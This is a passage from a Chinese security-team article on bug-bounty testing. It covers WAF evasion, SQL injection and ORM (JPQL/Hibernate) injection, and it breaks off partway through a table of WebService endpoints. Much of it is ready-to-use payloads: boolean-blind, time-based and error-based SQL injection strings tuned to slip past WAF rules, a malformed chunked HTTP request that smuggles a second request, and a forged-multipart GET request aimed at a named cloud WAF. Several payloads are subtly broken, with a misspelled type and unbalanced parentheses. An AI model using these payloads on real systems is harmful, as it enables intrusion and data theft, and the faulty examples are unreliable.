#  众测攻防技术深度剖析：突破WAF、框架漏洞利用与新型攻击面  
原创 鲸落  Rot5pider安全团队   2025-06-18 03:41  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1K26bQox3P7WP9dbZ8fiaWVicOSxjNfqYduiciaQ0iaZ7WFyadLnzbVicK8tW7YU4UEib2EsP5twVZ7IH4Yw/640?wx_fmt=png&from=appmsg "")  
  
# 众测攻防技术深度剖析：突破WAF、框架漏洞利用与新型攻击面  
## 前言：安全趋势演进与挑战  
  
当前安全领域已形成三大阵营：代表过去的传统漏洞平台、以乙方为首的众测平台，以及甲方主导的SRC平台。随着安全防御能力的不断提升，传统漏洞平台逐渐淡出视野，而SRC和众测平台成为安全研究的主战场。在这种背景下，安全研究人员需要掌握一套系统的方法论来应对日益复杂的防御体系。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/OMTnCvx3T1I2eNciawqTlg5vs2wIfmFgKeacsuYujhbLMZs36miaJzibGcplLqrG4z3Esu1aILx9G5dyZND4yUhQA/640?wx_fmt=jpeg&from=appmsg "")  
  
本文将从三个核心维度展开深入分析：  
1. **拦截框架下的注入过程拆解**  
 - 突破WAF的关键技术  
  
1. **三方调用框架漏洞利用**  
 - 挖掘隐藏的攻击面  
  
1. **SESSION与EXCEL的新型攻击场景**  
 - 边缘漏洞的实战应用  
  
通过系统化的技术分析和实战案例，为安全研究人员提供一套完整的众测攻防方法论。  
## 第一部分：拦截框架下注入的过程拆解  
### 1.1 数据库层面基础铺垫  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1I2eNciawqTlg5vs2wIfmFgKVoV9sgmQfQAH2qIDv0BcFdTA8Ij23Bweqb1wzuL4xsCLEa5WUKhlsA/640?wx_fmt=png&from=appmsg "")  
#### 1.1.1 判断性SQL语句的形式  
  
在WAF拦截环境下，传统的显错注入往往失效，需要采用更隐蔽的判断技术：  
```
/* MySQL布尔盲注技巧 */
IF(1=(SELECT 1 REGEXP IF(1=1,1,0x00)),1,1)=1

/* Oracle条件判断 */
NVL(TO_CHAR(DBMS_XMLGEN.getxml('select 1 from dual where 1337>1')),'1')!=1

/* SQL Server函数组合 */
ISNULL(NULLIF(SUBSTRING('admin',1,1),'a'),'c')='c'

```  
  
**技术本质**  
：利用数据库内置函数构造非标准布尔表达式，规避WAF的正则检测规则。这些语句的特点在于：  
- 避免使用常见关键词（如SELECT、WHERE）  
  
- 利用数据库特定函数（REGEXP、NVL、ISNULL）  
  
- 引入十六进制编码（0x00）绕过字符串检测  
  
#### 1.1.2 条件判断函数方法分析  
  
不同数据库的条件判断函数差异较大，需要针对性利用：  
  
<table><thead><tr><th style="color: rgb(53, 53, 53);font-size: 16px;line-height: 1.5em;letter-spacing: 0.04em;text-align: left;font-weight: bold;background: rgb(219, 217, 216) left top no-repeat;height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">数据库</span></section></th><th style="color: rgb(53, 53, 53);font-size: 16px;line-height: 1.5em;letter-spacing: 0.04em;text-align: left;font-weight: bold;background: rgb(219, 217, 216) left top no-repeat;height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">函数组合</span></section></th><th style="color: rgb(53, 53, 53);font-size: 16px;line-height: 1.5em;letter-spacing: 0.04em;text-align: left;font-weight: bold;background: rgb(219, 217, 216) left top no-repeat;height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">利用场景</span></section></th></tr></thead><tbody><tr style="color: rgb(53, 53, 53);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">MySQL</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">IFNULL()+LOCATE()+SUBSTR()</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">布尔盲注</span></section></td></tr><tr style="color: rgb(53, 53, 53);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">Oracle</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">NVL2()+NULLIF()+INSTR()</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">时间盲注</span></section></td></tr><tr style="color: rgb(53, 53, 53);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">SQL Server</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">PATINDEX()+CASE WHEN</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">报错注入</span></section></td></tr><tr style="color: rgb(53, 53, 53);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">PostgreSQL</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">COALESCE()+STRPOS()</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">联合查询</span></section></td></tr></tbody></table>  
  
**高级技巧**  
：函数嵌套绕过  
```
/* MySQL多层函数嵌套 */
IFNULL(1/(LOCATE(SUBSTR(@@version,1,1),'5')),'yes')='yes'

```  
  
此语句通过LOCATE函数定位版本号首字符，IFNULL处理除零错误，实现无报错信息下的精确判断。  
#### 1.1.3 通用型判断SQL语句对比  
  
跨数据库的通用判断技术是突破WAF的关键：  
```
/* 数字型通用判断 */
CASE WHEN (ASCII(SUBSTR((SELECT current_user),1,1))>97 THEN 1 ELSE 0 END

/* 字符串型通用判断 */
SUBSTRING(CAST(CURRENT_TIMESTAMP AS VARCHAR(20)),12,2) = '30'

```  
  
**防御突破点**  
：WAF通常难以解析复杂函数嵌套和类型转换，这为绕过提供了机会。  
### 1.2 层层递进分析WAF求证据  
#### 1.2.1 WAF产品的原理剖析  
  
现代WAF采用多层检测机制：  
1. **协议层解析**  
：解析HTTP/HTTPS协议  
  
1. **请求规范化**  
：处理URL编码、特殊字符  
  
1. **规则引擎匹配**  
：应用正则规则集  
  
1. **语义分析**  
：解析SQL语法结构  
  
1. **行为分析**  
：检测异常请求模式  
  
**绕过原理**  
：利用各层解析差异构造"畸形但合法"的请求：  
- 协议层：HTTP版本混淆（HTTP/1.0 vs HTTP/1.1）  
  
- 解析层：特殊字符处理差异（/\x0a/ vs /%0a/）  
  
- 规则层：非常规函数组合  
  
- 语义层：AST解析漏洞  
  
#### 1.2.2 全局过WAF的技术点  
  
**a. 畸形包绕过技术**  
```
POST /vuln.php HTTP/1.0\x0a
X-Header: \x0a\x0a
Transfer-Encoding: chunked\x0a\x0a
0\x0a\x0a
GET /admin?bypass=1 HTTP/1.1\x0a
Host: target.com\x0a\x0a

```  
  
**技术要点**  
：  
1. 使用HTTP/1.0协议触发兼容模式  
  
1. 添加特殊字符头部破坏解析  
  
1. 伪造分块传输编码  
  
1. 嵌入额外HTTP请求  
  
**b. 正向数据绕过技术**  
```
GET /search?q=test&file=----------&Content-Disposition: form-data; name="file"; filename="test.jpg" HTTP/1.1
Host: target.com

```  
  
**技术要点**  
：  
1. 在GET请求中伪造multipart边界  
  
1. 利用阿里云等WAF对GET请求的宽松处理  
  
1. 混用参数格式混淆解析器  
  
#### 1.2.3 漏洞层面的过WAF  
  
针对特定漏洞类型设计绕过方案：  
  
**SQL注入绕过矩阵**  
：  
  
<table><thead><tr><th style="color: rgb(53, 53, 53);font-size: 16px;line-height: 1.5em;letter-spacing: 0.04em;text-align: left;font-weight: bold;background: rgb(219, 217, 216) left top no-repeat;height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">注入类型</span></section></th><th style="color: rgb(53, 53, 53);font-size: 16px;line-height: 1.5em;letter-spacing: 0.04em;text-align: left;font-weight: bold;background: rgb(219, 217, 216) left top no-repeat;height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">绕过技术</span></section></th><th style="color: rgb(53, 53, 53);font-size: 16px;line-height: 1.5em;letter-spacing: 0.04em;text-align: left;font-weight: bold;background: rgb(219, 217, 216) left top no-repeat;height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">示例</span></section></th></tr></thead><tbody><tr style="color: rgb(53, 53, 53);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">联合查询</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">非常规列类型转换</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf="">UNION SELECT NULL,CONVERT(@@version,UMSIGNED),NULL</span></code></td></tr><tr style="color: rgb(53, 53, 53);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">布尔盲注</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">函数嵌套+错误处理</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf="">IFNULL(1/EXP(LOG(IF(1=1,1,0))),0)</span></code></td></tr><tr style="color: rgb(53, 53, 53);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">时间盲注</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">条件触发+系统函数</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf="">CASE WHEN 1=1 THEN BENCHMARK(1000000,MD5(&#39;a&#39;)) ELSE 0 END</span></code></td></tr><tr style="color: rgb(53, 53, 53);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">报错注入</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">几何函数+类型转换</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><code><span leaf="">ST_LatFromGeoHash(IF(1=1,UPDATEXML(1,CONCAT(0x7e,(SELECT USER())),1),1)</span></code></td></tr></tbody></table>  
### 1.3 框架层的语句分析  
#### 1.3.1 基于JPQL类型的绕过分析  
  
JPQL注入漏洞源于不安全的查询拼接：  
```
// 不安全实现
String jpql = "SELECT u FROM User u WHERE u.username = '" + input + "'";
Query query = em.createQuery(jpql);

// 攻击向量
input = "admin' OR '1'='1'--";

```  
  
**高级绕过技术**  
：  
```
// 利用Hibernate特性
input = "\\' OR 1=1 OR '1'='1";

// 生成的SQL
SELECT * FROM users WHERE username = '\' OR 1=1 OR \'1\'=\'1'

```  
  
**漏洞根源**  
：ORM框架的查询转换过程中，转义字符处理不当导致SQL注入。  
#### 1.3.2 基于Hibernate类型的绕过分析  
  
Hibernate的HQL注入更具技术性：  
```
// 攻击向量构造
String username = "test\\\" OR 1<length((select version()))--";

// 最终生成SQL
SELECT * FROM users WHERE username = 'test\" OR 1<length((select version()))--'

```  
  
**技术突破点**  
：  
1. 利用双引号转义(\"  
)突破字符串边界  
  
1. 嵌套SQL函数实现盲注  
  
1. 注释符终止后续语句  
  
**防御绕过**  
：传统WAF难以解析ORM的转换逻辑，导致此类注入难以被检测。  
## 第二部分：基于三方调用框架分析利用  
### 2.1 WEBSERVICE接口漏洞挖掘  
#### 2.1.1 默认安全配置风险  
  
常见WebService框架的默认风险端点：  
  
<table><thead><tr><th style="color: rgb(53, 53, 53);font-size: 16px;line-height: 1.5em;letter-spacing: 0.04em;text-align: left;font-weight: bold;background: rgb(219, 217, 216) left top no-repeat;height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">框架</span></section></th><th style="color: rgb(53, 53, 53);font-size: 16px;line-height: 1.5em;letter-spacing: 0.04em;text-align: left;font-weight: bold;background: rgb(219, 217, 216) left top no-repeat;height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">默认路径</span></section></th><th style="color: rgb(53, 53, 53);font-size: 16px;line-height: 1.5em;letter-spacing: 0.04em;text-align: left;font-weight: bold;background: rgb(219, 217, 216) left top no-repeat;height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">风险级别</span></section></th><th style="color: rgb(53, 53, 53);font-size: 16px;line-height: 1.5em;letter-spacing: 0.04em;text-align: left;font-weight: bold;background: rgb(219, 217, 216) left top no-repeat;height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">漏洞类型</span></section></th></tr></thead><tbody><tr style="color: rgb(53, 53, 53);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">Axis2</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">/services/*</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">高危</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">XXE、未授权访问</span></section></td></tr><tr style="color: rgb(53, 53, 53);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 